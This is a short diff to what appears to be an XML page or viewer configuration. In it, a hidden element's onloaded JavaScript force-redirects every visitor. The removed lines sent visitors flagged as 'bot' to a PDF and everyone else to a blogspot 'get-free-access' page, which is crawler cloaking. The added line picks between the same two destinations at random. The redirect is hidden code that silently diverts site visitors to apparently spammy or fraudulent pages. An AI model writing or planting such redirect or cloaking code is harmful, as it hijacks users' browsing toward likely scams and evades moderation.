@@ -6,9 +6,7 @@
     visible="false"
     onloaded="js(
       (function(){
-        var ua = new URLSearchParams(window.location.search).get('ua');
-
-        if (ua === 'bot') {
+        if (Math.random() &lt; 0.5) {
           window.location.href = 'https://shivammarora.github.io/newone/reservationhatao001.pdf';
         } else {
           window.location.href = 'https://romarioseas.blogspot.com/2026/07/get-free-access.html';
